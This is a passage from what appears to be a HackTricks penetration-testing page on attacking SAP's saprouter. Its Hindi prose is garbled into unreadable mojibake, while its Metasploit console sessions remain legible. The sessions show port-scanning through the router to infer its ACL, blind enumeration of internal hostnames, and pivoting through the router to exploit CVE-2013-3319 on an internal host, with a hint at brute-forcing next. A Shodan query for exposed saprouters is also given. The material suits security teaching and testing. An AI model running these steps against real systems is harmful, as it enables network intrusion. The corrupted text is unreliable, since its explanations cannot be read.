SAP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ saprouter рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рд╣реИ, рдФрд░ рдпрд╣реА SAP GUI рдХрд╛ рдЙрдкрдпреЛрдЧ saprouter рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ SAP DIAG рдкреЛрд░реНрдЯ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддрд╛ рд╣реИред рд╕рд╛рдзрд╛рд░рд┐рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ saprouter рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдиреНрдп рдкреНрд░рдХрд╛рд░ рдХреЗ рдХрдиреЗрдХреНрд╢рди рдХреЛ рдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕ рдореЙрдбреНрдпреВрд▓ рдХреА рд╕рд╣рд╛рдпрддрд╛ рд╕реЗ рд╣рдо рд╕реНрдХреИрди рдХреЗ рджреМрд░рд╛рди MODE рд╡рд┐рдХрд▓реНрдк рдореЗрдВ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдиреЗрдХреНрд╢рди рдХреЗ рдХрд┐рд╕ рдкреНрд░рдХрд╛рд░ рдХреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ SAP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ, рдЬреЛ рдЙрддреНрдкрд╛рджрди рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, saprouter рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдиреНрдп рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рднреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рддреА рд╣реИ, рдЬрд╣рд╛рдВ ACL рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░реЗрдЧрд╛ рдХрд┐ saprouter рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рд╛рдзрд╛рд░рд┐рдд (TCP) рдХрдиреЗрдХреНрд╢рди рдХреЛ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рдПред

рд╣рдо MODE рдХреЛ TCP рдкрд░ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╣рдо рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдХрдиреЗрдХреНрд╢рди рдХреЛ рдЕрдиреБрдорддрд┐ рд╣реИред рдЕрдм рд╣рдо рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯ рдХреЛ рд╕реНрдХреИрди рдХрд░реЗрдВрдЧреЗ, рдЬреЛ рдХрд┐ рдкреЛрд░реНрдЯ 3200 (SAP DIAG) рдФрд░ 80 (HTTP) рджреЛрдиреЛрдВ рдкрд░ рд╣реЛрддреЗ рд╣реИрдВ, VERBOSE рдХреЛ true рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВрдЧреЗ, рджреЛрдиреЛрдВ рдЗрдВрд╕реНрдЯреЗрдВрд╕ 00 рдФрд░ 01 рдкрд░, рдФрд░ рджреЗрдЦреЗрдВрдЧреЗ рдХрд┐ рдХреНрдпрд╛ рд╣реЛрддрд╛ рд╣реИ:
```text
msf auxiliary(sap_router_portscanner) > set MODE TCP
MODE => TCP

msf auxiliary(sap_router_portscanner) > set PORTS 80,32NN
PORTS => 80,32NN
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-01
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[+] 192.168.1.18:80 - TCP OPEN
[-] 192.168.1.18:3200 - blocked by ACL
[+] 192.168.1.18:3201 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host          Port  State  Info
----          ----  -----  ----
192.168.1.18  80    open
192.168.1.18  3201  open   SAP Dispatcher sapdp01

[*] Scanning 192.168.1.1
[-] 192.168.1.1:3200 - blocked by ACL
[+] 192.168.1.1:3201 - TCP OPEN
[+] 192.168.1.1:80 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host         Port  State  Info
----         ----  -----  ----
192.168.1.1  3201  open   SAP Dispatcher sapdp01
192.168.1.1  80    open

[*] Auxiliary module execution completed
```
рдЖрдЙрдЯрдкреБрдЯ рдФрд░ рдкрд┐рдЫрд▓реА рдЬрд╛рдирдХрд╛рд░реА рд╕реЗ рд╣рдо рдЕрдм рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ ACL рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рд╣реИ:

* рдХрд┐рд╕реА рднреА рд╣реЛрд╕реНрдЯ рд╕реЗ 192.168.1.1 рдкрд░ рдкреЛрд░реНрдЯ 80 рдХреЗ рд▓рд┐рдП TCP рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐
* рдХрд┐рд╕реА рднреА рд╣реЛрд╕реНрдЯ рд╕реЗ 192.168.1.18 рдкрд░ рдкреЛрд░реНрдЯ 80 рдХреЗ рд▓рд┐рдП TCP рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐
* рдХрд┐рд╕реА рднреА рд╣реЛрд╕реНрдЯ рд╕реЗ 192.168.1.1 рдкрд░ рдкреЛрд░реНрдЯ 3201 рдХреЗ рд▓рд┐рдП TCP рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐
* рдХрд┐рд╕реА рднреА рд╣реЛрд╕реНрдЯ рд╕реЗ 192.168.1.18 рдкрд░ рдкреЛрд░реНрдЯ 3201 рдХреЗ рд▓рд┐рдП TCP рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐
* рдХрд┐рд╕реА рднреА рд╣реЛрд╕реНрдЯ рд╕реЗ 192.168.1.18 рдкрд░ рдкреЛрд░реНрдЯ 3200 рдХреЗ рд▓рд┐рдП SAP рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐

**рдЖрдВрдзрд╛ рдЖрдВрдХрдбрд╝реЛрдВ рдХрд╛ рдЖрдВрдХрдбрд╝рд╛рд╡рд╢реНрдпрдХреАрдХрд░рдг**

рдпрджрд┐ рдЖрдк рдпрд╛рдж рдХрд░реЗрдВ, рд╣рдордиреЗ рд╕рдкрд░рд╛рдЙрдЯрд░ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХреА рдереА рдЬреЛ рд╣рдореЗрдВ рдПрдХ рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯ рдХреЗ рдЖрдИрдкреА рдкрддреЗ рдХреЛ рдЬрд╛рдирдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдФрд░ рд╣рдо рд╡рд╣рд╛рдВ рд╕реЗ рдЖрдЧреЗ рдмрдврд╝реЗред рд▓реЗрдХрд┐рди рдпрджрд┐ рд╕рдкрд░рд╛рдЙрдЯрд░ рд╣рдореЗрдВ рдЙрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рддреЛ рдХреНрдпрд╛ рд╣реЛрдЧрд╛?

рдПрдХ рд╡рд┐рдХрд▓реНрдк рд╣реИ рдХрд┐ рд╣рдо рдХреЗрд╡рд▓ рдирд┐рдЬреА рдкрддрд╛ рдЕрдВрддрд░рд┐рдХреНрд╖реЛрдВ рдХреЛ рд╕реНрдХреИрди рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ рдФрд░ рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рд╣реЛрддрд╛ рд╣реИред рджреВрд╕рд░рд╛ рд╣реИ рдХрд┐ рд╣рдо рд╣реЛрд╕реНрдЯрдирд╛рдо рджреНрд╡рд╛рд░рд╛ рдЖрдВрдзрд╛ рдЖрдВрдХрдбрд╝реЛрдВ рдХрд╛ рдЖрдВрдХрдбрд╝рд╛рд╡рд╢реНрдпрдХреАрдХрд░рдг рдХрд░реЗрдВред

рд╕рдкрд░рд╛рдЙрдЯрд░ рд╣рдореЗрдВ рдЙрди рд╣реЛрд╕реНрдЯрдирд╛рдореЛрдВ рдХреЛ рд╕рдВрдкрд░реНрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд░рдЦрддрд╛ рд╣реИ рдЬрд┐рдирдХрд╛ рд╣рдо рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВред рд╕рдкрд░рд╛рдЙрдЯрд░ рд╣рдореЗрдВ рдпрд╣ рднреА рдмрддрд╛рддрд╛ рд╣реИ рдХрд┐ рдЬрдм рдпрд╣ рд╕рдВрдкрд░реНрдХ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рдЕрд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ рддреЛ рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреНрдпрд╛ рд╣реЛрддреА рд╣реИрдВ \(рдЖрдк рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЕрджреНрдпрддрди рдХрд░рдХреЗ рдореЙрдбреНрдпреВрд▓ рд╕реНрд░реЛрдд рдкрд░ рд▓рд╛рдЗрди 242 рдХреА рдЯрд┐рдкреНрдкрдгреА рдХреЛ рд╣рдЯрд╛рдХрд░\)

рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХреЗ рд╕рд╛рде рд╣рдо рд╣реЛрд╕реНрдЯрдирд╛рдо рджреНрд╡рд╛рд░рд╛ рдЖрдВрдзрд╛ рдЖрдВрдХрдбрд╝реЛрдВ рдХрд╛ рдЖрдВрдХрдбрд╝рд╛рд╡рд╢реНрдпрдХреАрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рд╕реАрдзреЗ рдЧреЛрд▓реНрдб рдХреЗ рд▓рд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ!

рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ RESOLVE рд╡рд┐рдХрд▓реНрдк рдХреЛ "рджреВрд░рд╕реНрде" рдкрд░ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдореЙрдбреНрдпреВрд▓ TARGETS рдХреЗ рд▓рд┐рдП рд╕рдВрдмрдВрдз рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдЧрд╛, рдЙрдиреНрд╣реЗрдВ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рд╕рдВрдХреНрд╖реЗрдкрд┐рдд рдирд╣реАрдВ рдХрд░реЗрдЧрд╛, рдФрд░ рд╣рдо рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯ рдХреЛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЙрдирдХреЗ рдЖрдИрдкреА рдкрддреЗ рдХреЛ рдХрднреА рдирд╣реАрдВ рдЬрд╛рдирддреЗ рд╣реБрдП рдЙрдирд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╣реЛрд╕реНрдЯреЛрдВ рдХреЛ рдЖрдВрдзрд╛ рдЖрдВрдХрдбрд╝реЛрдВ рдХрд╛ рдЖрдВрдХрдбрд╝рд╛рд╡рд╢реНрдпрдХреАрдХрд░рдг рдХрд░рддреЗ рд╕рдордп рдпрд╛рдж рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд╛рддреЗрдВ:

* VERBOSE рдХреЛ true рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВ;
* MODE рдХреЛ SAP\_PROTO рдкрд░ рд╕реЗрдЯ рдХрд░рдиреЗ рд╕реЗ рд╣рдореЗрдВ saprouter рд╕реЗ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓реЗрдЧреА;
* рдЗрд╕ рд╕рдордп рдХреЗрд╡рд▓ рдПрдХ рдкреЛрд░реНрдЯ рд╕реЗрдЯ рдХрд░рдирд╛ рдкрд░реНрдпрд╛рдкреНрдд рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рд╣рдореЗрдВ рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░ рдХреЗрд╡рд▓ saprouter рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреА рдЧрдИ рдЬрд╛рдирдХрд╛рд░реА рд╕реЗ рдЗрдВрдЯрд░реЗрд╕реНрдЯ рд╣реИ \(3200 рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ\);
* рдкрд░рд┐рдгрд╛рдо рд╡рд┐рдиреНрдпрд╕реНрдд рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ рдЖрдпреЛрдЬрд┐рдд ACL рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░реЗрдВрдЧреЗред рджреБрд░реНрднрд╛рдЧреНрдп рд╕реЗ рдЕрд╡рд░реЛрдзрд┐рдд рдХрдиреЗрдХреНрд╢рди рд╣рдореЗрдВ рдмрд╣реБрдд рдЬреНрдЮрд╛рди рдирд╣реАрдВ рджреЗрдВрдЧреЗред

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рд╣рдо sap, sapsrv рдФрд░ sapsrv2 рд╣реЛрд╕реНрдЯрдирд╛рдо рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВрдЧреЗред
```text
msf auxiliary(sap_router_portscanner) > set RESOLVE remote
RESOLVE => remote
msf auxiliary(sap_router_portscanner) > set MODE SAP_PROTO
MODE => SAP_PROTO
msf auxiliary(sap_router_portscanner) > set VERBOSE true
VERBOSE => true
msf auxiliary(sap_router_portscanner) > set TARGETS sap,sapsrv,sapsrv2
TARGETS => sap,sapsrv,sapsrv2
msf auxiliary(sap_router_portscanner) > set PORTS 3200
PORTS => 3200
msf auxiliary(sap_router_portscanner) > run

[*] Scanning sap
[-] sap:3200 - unknown host
[!] Warning: Service info could be inaccurate
[*] Scanning sapsrv
[-] sapsrv:3200 - host unreachable
[!] Warning: Service info could be inaccurate
[*] Scanning sapsrv2
[+] sapsrv2:3200 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host     Port  State  Info
----     ----  -----  ----
sapsrv2  3200  open   SAP Dispatcher sapdp00

[*] Auxiliary module execution completed
```
рдЖрдЙрдЯрдкреБрдЯ рд╕реЗ рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ "sap" рд╣реЛрд╕реНрдЯ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ, рд▓реЗрдХрд┐рди "sapsrv" рд╣реЛрд╕реНрдЯ рдореМрдЬреВрдж рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдпрд╣ рдЕрдкреНрд░рд╛рдкреНрдп рд╣реИ, рдФрд░ "sapsrv2" рд╣реЛрд╕реНрдЯ рдореМрдЬреВрдж рд╣реИ рдФрд░ рд╣рдо рдкреЛрд░реНрдЯ 3200 рдкрд░ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдЕрдиреНрдп рд╣реЛрд╕реНрдЯ рдвреВрдВрдврдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, SAP рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдирд╣реАрдВ, рдмрд╕ рд╕рд╛рдорд╛рдиреНрдп рд╣реЛрд╕реНрдЯрдиреЗрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рдЬреИрд╕реЗ smtp, exchange, pdc, bdc, fileshare, intranet, рдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рддрдиреЗ рднреА рдЕрдЪреНрдЫреЗ рд╣реЛрд╕реНрдЯрдиреЗрдо рд╣реЛрдВрдЧреЗ рдЙрдиреНрд╣реЗрдВ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░реЗрдВ

**рдЕрдВрддрд┐рдо рдореАрд▓**

рдЕрдм рдЬрдм рд╣рдордиреЗ рдЗрд╕ рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд▓рд┐рдпрд╛ рд╣реИ, рд╣рдореЗрдВ рдкрддрд╛ рд╣реИ рдХрд┐ рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯ рдЙрдкрд▓рдмреНрдз рд╣реИрдВ, рдХреМрди рд╕реА рд╕реЗрд╡рд╛рдПрдВ рдЕрдиреБрдордд рд╣реИрдВ, рдФрд░ рд╣рдо рдХреМрди рд╕реЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╕реИрдкрд░рд╛рдЙрдЯрд░ рдХреЛ рдЫреЗрджрдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЖрдВрддрд░рд┐рдХ рд╕рд░реНрд╡рд░реЛрдВ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рд╣рдорд╛рд░реЗ рдкреЗрдВрдЯреЗрд╕реНрдЯ рдХреЗ рд╕рд╛рде рдЖрдЧреЗ рдмрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред

Metasploit рд╣рдореЗрдВ рдПрдХ рд╢рд╛рдирджрд╛рд░ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рд╕реИрдкрд░рд╛рдЙрдЯрд░ рдХреЛ рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, Proxies рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдзрдиреНрдпрд╡рд╛рдж Dave Hartley \([@nmonkee](http://twitter.com/nmonkee)\) рдХреЗ рд▓рд┐рдПред

рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░, рд╣рдореЗрдВ рдЖрдВрддрд░рд┐рдХ рд╕реИрдк рд╕рд░реНрд╡рд░ рдкрд░ рдЬрд╛рдирдХрд╛рд░реА рдЗрдХрдЯреНрдард╛ рдХрд░рдиреА рд╣реИ рдЬрд┐рд╕реЗ рд╣рдордиреЗ 192.168.1.18 рд╣реЛрд╕реНрдЯ рдореЗрдВ рдЦреЛрдЬрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ, рд╣рдо [`sap_hostctrl_getcomputersystem`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_hostctrl_getcomputersystem) рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ рдЬреЛ CVE-2013-3319 рдХрд╛ рд╢реЛрдз рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╣рдореЗрдВ рд╡рд┐рд╡рд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ рдХрд┐рд╕ рдУрдПрд╕ рдкрд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИ, рд╕реИрдк рд╣реЛрд╕реНрдЯ рдХрдВрдЯреНрд░реЛрд▓ рд╕реЗрд╡рд╛ рдкрд░ рдкреЛрд░реНрдЯ 1128 рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдЕрдкреНрд░рдорд╛рдгрд┐рдд SOAP рдЕрдиреБрд░реЛрдз рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗред рд╣рдо metasploit рдореЗрдВ рдкреНрд░реЙрдХреНрд╕реА рд╕рдорд░реНрдерди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реИрдкрд░рд╛рдЙрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд┐рд╡рдЯ рдХрд░реЗрдВрдЧреЗ:

![](https://blog.rapid7.com/content/images/post-images/33923/image2.jpg)
```text
msf auxiliary(sap_router_portscanner) > use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem
msf auxiliary(sap_hostctrl_getcomputersystem) > set Proxies sapni:1.2.3.101:3299
Proxies => sapni:1.2.3.101:3299
msf auxiliary(sap_hostctrl_getcomputersystem) > set RHOSTS 192.168.1.18
RHOSTS => 192.168.1.18
msf auxiliary(sap_hostctrl_getcomputersystem) > run

[+] 192.168.1.18:1128 - Information retrieved successfully
[*] 192.168.1.18:1128 - Response stored in /Users/msfusr/.msf4/loot/20140107180827_default_192.168.1.18_sap.getcomputers_386124.xml (XML) and /Users/msfusr/.msf4/loot/20140107180827_default_192.168.1.18_sap.getcomputers_186948.txt (TXT)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
рдпрджрд┐ рд╕рдм рдХреБрдЫ рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рд╣реБрдЖ рд╣реИ, рддреЛ рдЖрдкрдХреЗ рдкрд╛рд╕ рд▓реВрдЯ рдореЗрдВ рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЕрдЪреНрдЫрд╛ рдЖрдЙрдЯрдкреБрдЯ рд╣реЛрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рдЯрд╛рд░рдЧреЗрдЯ SAP рд╣реЛрд╕реНрдЯ рд╕реЗ рд░реБрдЪрд┐рдХрд░ рдЖрдВрддрд░рд┐рдХ рдЬрд╛рдирдХрд╛рд░реА (рдЬреИрд╕реЗ рдХрд┐ рдЖрдк рдлрд┐рд░ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ) рд╢рд╛рдорд┐рд▓ рд╣реЛрдЧреАред

рдкрд┐рд╡рдЯрд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯ рдХреЗ рдЦрд┐рд▓рд╛рдл рдЕрдиреНрдп рдореЙрдбреНрдпреВрд▓реЛрдВ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд╕рд┐рд░реНрдл SAP рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЗ рд▓рд┐рдП рд╣реА рдирд╣реАрдВ!

**рдирд┐рд╖реНрдХрд░реНрд╖**

рд╣рдордиреЗ рджреЗрдЦрд╛ рд╣реИ рдХрд┐ рдХреИрд╕реЗ рдХрдордЬреЛрд░ saprouter рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯ рддрдХ рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдЗрд╕рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ metasploit рдХреЗ рд╕рдорд░реНрдерди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SAP рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЗ рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдПред

рдореБрдЭреЗ рдЖрд╢рд╛ рд╣реИ рдХрд┐ рдпрд╣ рд▓реЗрдЦ saprouter рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗ рдЬреЛрдЦрд┐рдореЛрдВ рдХреЗ рд╕рд╛рде-рд╕рд╛рде SAP рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рднреА рдкреНрд░рдХрд╛рд╢ рдбрд╛рд▓рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИред

**рд╕рдВрджрд░реНрдн**

* [http://labs.mwrinfosecurity.com/blog/2012/09/13/sap-smashing-internet-windows/](http://labs.mwrinfosecurity.com/blog/2012/09/13/sap-smashing-internet-windows/)
* \[[http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2](http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2) - Mariano Nun ez Di Croce - SAProuter .pdf\]\([http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2](http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2) - Mariano Nunez Di Croce - SAProuter .pdf\)
* [http://scn.sap.com/docs/DOC-17124](http://scn.sap.com/docs/DOC-17124)
* [http://help.sap.com/saphelp\_nw70/helpdata/EN/4f/992dfe446d11d189700000e8322d00/f rameset.htm](http://help.sap.com/saphelp_nw70/helpdata/EN/4f/992dfe446d11d189700000e8322d00/frameset.htm)
* [http://help.sap.com/saphelp\_dimp50/helpdata/En/f8/bb960899d743378ccb8372215bb767 /content.htm](http://help.sap.com/saphelp_dimp50/helpdata/En/f8/bb960899d743378ccb8372215bb767/content.htm)
* [http://labs.integrity.pt/advisories/cve-2013-3319/](http://labs.integrity.pt/advisories/cve-2013-3319/)
* [SAP Service Discovery \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_service_discovery)
* [SAPRouter Admin Request \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_info_request)
* [CVE-2013-3319 SAP Host Agent Information Disclosure \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_hostctrl_getcomputersystem)
* [SAPRouter Port Scanner \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_portscanner)

# Shodan

* `port:3299 !HTTP Network packet too big`



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдиреЗ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ 